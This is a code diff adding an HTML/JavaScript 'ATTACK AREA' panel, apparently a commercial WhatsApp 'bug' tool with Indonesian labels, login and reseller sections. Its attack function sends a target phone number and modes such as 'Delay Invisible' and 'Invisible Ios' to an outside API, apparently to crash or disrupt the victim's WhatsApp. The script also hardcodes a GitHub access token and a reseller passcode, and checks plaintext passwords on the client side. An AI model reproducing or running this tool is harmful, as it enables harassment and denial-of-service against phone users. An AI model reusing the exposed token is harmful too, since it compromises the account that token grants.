@@ -1,0 +1,352 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Multos-Super Vip</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@600&display=swap" rel="stylesheet">
+  <script src="https://cdn.jsdelivr.net/npm/particles.js@2.0.0/particles.min.js"></script>
+  <style>
+  body {
+    margin: 0;
+    padding: 0;
+    height: 100%;
+    background: url('https://a.top4top.io/p_34957vsqn1.jpg') no-repeat center center fixed;
+    background-size: cover;
+    /* Hapus semua efek blur */
+    filter: none;
+    backdrop-filter: none;
+     font-family: 'Orbitron', sans-serif;
+  }
+
+  #particles-js {
+    position: absolute;
+    width: 100%;
+    height: 100%;
+    z-index: -1;
+    filter: none;
+    backdrop-filter: none;
+  }
+
+    .container {
+      position: relative;
+      z-index: 2;
+      max-width: 500px;
+      margin: 100px auto;
+      padding: 25px;
+      border-radius: 15px;
+      text-align: center;
+      backdrop-filter: blur(900px);
+    }
+    .title {
+      font-size: 1.4rem;
+      margin: 15px 0;
+    }
+    input, button, select {
+      width: 100%;
+      padding: 12px;
+      margin: 8px 0;
+      border-radius: 10px;
+      border: none;
+      font-size: 1rem;
+    }
+    button {
+      background: linear-gradient(to right, #ffffff, #000000);
+      color: #000;
+      cursor: pointer;
+    }
+    button:hover {
+      background: linear-gradient(to right, #cccccc, #111111);
+    }
+    video {
+      width: 100%;
+      border-radius: 12px;
+      margin-bottom: 10px;
+    }
+    .hidden {
+      display: none;
+    }
+    .logo-img {
+      width: 80px;
+      border-radius: 10px;
+    }
+    .credit {
+      font-size: 0.9rem;
+      margin-top: 15px;
+    }
+    .credit a {
+      color: #00ffff;
+      text-decoration: none;
+    }
+    #accessModal {
+      position: fixed;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
+      background: rgba(0, 0, 0, 0.85);
+      display: none;
+      justify-content: center;
+      align-items: center;
+      z-index: 999;
+    }
+    #accessModal.active {
+      display: flex;
+    }
+    #accessModal .modal-content {
+      background: #111;
+      padding: 20px;
+      border-radius: 10px;
+      color: white;
+      width: 90%;
+      max-width: 350px;
+      box-shadow: 0 0 20px #00ffff66;
+      text-align: center;
+    }
+    #splash {
+      position: fixed;
+      top: 0; left: 0;
+      width: 100%;
+      height: 100%;
+      background: #000;
+      z-index: 9999;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-direction: column;
+      color: white;
+    }
+    .floating {
+      position: fixed;
+      bottom: 30px;
+      left: 50%;
+      transform: translateX(-50%);
+      background: #1e1e1e;
+      padding: 15px 25px;
+      border-radius: 12px;
+      color: #fff;
+      font-size: 0.95rem;
+      box-shadow: 0 0 10px rgba(255,255,255,0.2);
+      z-index: 1000;
+      animation: fadein 0.3s ease;
+    }
+    @keyframes fadein {
+      from { opacity: 0; transform: translateX(-50%) translateY(20px); }
+      to { opacity: 1; transform: translateX(-50%) translateY(0); }
+    }
+    .button-row {
+      display: flex;
+      justify-content: space-between;
+      gap: 10px;
+      margin-top: 15px;
+    }
+  </style>
+</head>
+<body>
+  <div id="particles-js"></div>
+  <div id="splash">
+    <img src="https://g.top4top.io/p_34958kf8l1.jpg" width="200" />
+    <p style="margin-top:50px;">Loading......</p>
+  </div>
+  
+  <div class="container" id="loginBox">
+    <img src="https://j.top4top.io/p_3495stde11.jpg" class="logo-img" />
+    <div class="title">ATTACK AREA LOGIN</div>
+    <input type="text" id="username" placeholder="Username" />
+    <input type="password" id="password" placeholder="Password" />
+    <button onclick="handleLogin()">Login</button>
+    <button onclick="window.open('https://t.me/rilzmoleq')">Developer</button>
+    <div id="loginResult"></div>
+  </div>
+
+  <div class="container hidden" id="mainBox">
+    <img src="https://g.top4top.io/p_34958kf8l1.jpg" class="logo-img" />
+    <div class="title">Evolution Bug With APK</div>
+    <select id="mode">
+      <option value="delay">Delay</option>
+      <option value="delayinvis">Delay Invisible</option>
+      <option value="delayhard">Delay Hard</option>
+      <option value="dozer">Extra Kuota</option>
+      <option value="iosinvis">Invisible Ios</option>
+    </select>
+    <input type="text" id="target" placeholder="Nomor Target" />
+    <button onclick="attack()">Attack</button>
+    <div id="expiredInfo"></div>
+    <div id="apiStatus"></div>
+    <div class="button-row">
+      <button onclick="logout()">Logout</button>
+      <button onclick="window.open('https://t.me/rilzmoleq')">Developer</button>
+    </div>
+  </div>
+
+  <div class="container hidden" id="resellerBox">
+    <div class="title">RESELLER AREA</div>
+    <input type="text" id="resUsername" placeholder="Username Baru" />
+    <input type="password" id="resPassword" placeholder="Password Baru" />
+    <input type="datetime-local" id="resExpired" />
+    <button onclick="addResellerUser()">Tambah User</button>
+    <div id="resResult"></div>
+    <button onclick="backToLogin()">Kembali</button>
+  </div>
+
+  <div id="accessModal">
+    <div class="modal-content">
+      <h3>Masukkan Kode Akses</h3>
+      <input type="password" id="accessCodeInput" placeholder="Kode Akses" />
+      <button onclick="checkAccessCode()">Lanjutkan</button>
+    </div>
+  </div>
+
+  <script>
+    particlesJS("particles-js", {
+      particles: {
+        number: { value: 60 },
+        size: { value: 2.5 },
+        move: { speed: 0.6 },
+        line_linked: { enable: true, color: "#ffffff" }
+      },
+      interactivity: {
+        events: { onhover: { enable: true, mode: "repulse" } }
+      }
+    });
+
+    const token = "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";
+    const repo = "ProjectShenzu/DatabaseEvolution";
+    const filePath = "DatabaseWeb.json";
+    let currentUser = null;
+    let logoutTimeout;
+
+    function showFloating(message) {
+      const note = document.createElement("div");
+      note.className = "floating";
+      note.innerText = message;
+      document.body.appendChild(note);
+      setTimeout(() => note.remove(), 3000);
+    }
+
+    function showAccessModal() {
+      document.getElementById("accessModal").classList.add("active");
+    }
+
+    function checkAccessCode() {
+      const kode = document.getElementById("accessCodeInput").value.trim();
+      if (kode === "Qrilz9OpHResseler017@jkwitta") {
+        document.getElementById("accessModal").classList.remove("active");
+        document.getElementById("loginBox").classList.add("hidden");
+        document.getElementById("resellerBox").classList.remove("hidden");
+      } else {
+        showFloating("Kode salah.");
+      }
+    }
+
+    async function handleLogin() {
+      const user = document.getElementById("username").value.trim();
+      const pass = document.getElementById("password").value.trim();
+      const res = await fetch("https://raw.githubusercontent.com/ProjectShenzu/DatabaseEvolution/main/DatabaseWeb.json");
+      const json = await res.json();
+      const found = json.users.find(u => u.username === user && u.password === pass);
+      if (found) {
+        currentUser = found;
+        document.getElementById("loginBox").classList.add("hidden");
+        document.getElementById("mainBox").classList.remove("hidden");
+        document.getElementById("expiredInfo").innerText = "Expired: " + found.expired;
+        autoLogout();
+      } else {
+        showFloating("Login gagal");
+      }
+    }
+
+    function logout() {
+      clearTimeout(logoutTimeout);
+      currentUser = null;
+      document.getElementById("mainBox").classList.add("hidden");
+      document.getElementById("loginBox").classList.remove("hidden");
+    }
+
+    function autoLogout() {
+      logoutTimeout = setTimeout(() => {
+        logout();
+        showFloating("Sesi anda berakhir");
+      }, 1000 * 60 * 15); // auto logout 15 menit
+    }
+
+    async function addResellerUser() {
+      const user = document.getElementById("resUsername").value.trim();
+      const pass = document.getElementById("resPassword").value.trim();
+      const exp = document.getElementById("resExpired").value;
+      if (!user || !pass || !exp) return showFloating("Lengkapi semua field");
+
+      const githubUrl = `https://api.github.com/repos/${repo}/contents/${filePath}`;
+      const res = await fetch(githubUrl, {
+        headers: { Authorization: `Bearer ${token}` }
+      });
+      const data = await res.json();
+      const content = JSON.parse(atob(data.content));
+      if (!content.users) content.users = [];
+      content.users.push({ username: user, password: pass, expired: exp });
+
+      const updated = await fetch(githubUrl, {
+        method: "PUT",
+        headers: {
+          Authorization: `Bearer ${token}`,
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          message: `add user ${user}`,
+          content: btoa(JSON.stringify(content, null, 2)),
+          sha: data.sha
+        })
+      });
+
+      if (updated.ok) {
+        showFloating("User berhasil ditambahkan");
+      } else {
+        showFloating("Gagal menambahkan user.");
+      }
+    }
+
+    function backToLogin() {
+      document.getElementById("resellerBox").classList.add("hidden");
+      document.getElementById("loginBox").classList.remove("hidden");
+    }
+
+    async function attack() {
+      const target = document.getElementById("target").value.trim();
+      const mode = document.getElementById("mode").value;
+      if (!target) return showFloating("Masukkan target!");
+
+      showFloating("Menyerang...");
+
+      const url = `https://apievolution.gacorr.biz.id/evolution?type=${mode}&chatId=${target}@s.whatsapp.net`;
+      try {
+        const res = await fetch(url);
+        const json = await res.json();
+        if (json.success) {
+          showFloating("Berhasil serang " + target);
+        } else {
+          showFloating("Gagal serang " + target);
+        }
+      } catch {
+        showFloating("Gagal kirim request");
+      }
+    }
+
+    async function checkApiStatus() {
+      try {
+        const res = await fetch("https://apievolution.gacorr.biz.id/status");
+        const json = await res.json();
+        document.getElementById("apiStatus").innerText = json.connected ? "API connected ✅" : "API Disconnected ❎";
+      } catch {
+        document.getElementById("apiStatus").innerText = "API Status Error";
+      }
+    }
+
+    setInterval(checkApiStatus, 5000);
+    checkApiStatus();
+
+    window.onload = () => {
+      setTimeout(() => {
+        document.getElementById("splash").style.display = "none";
+      }, 1800);
+    };
+  </script>
+</body>
+</html>
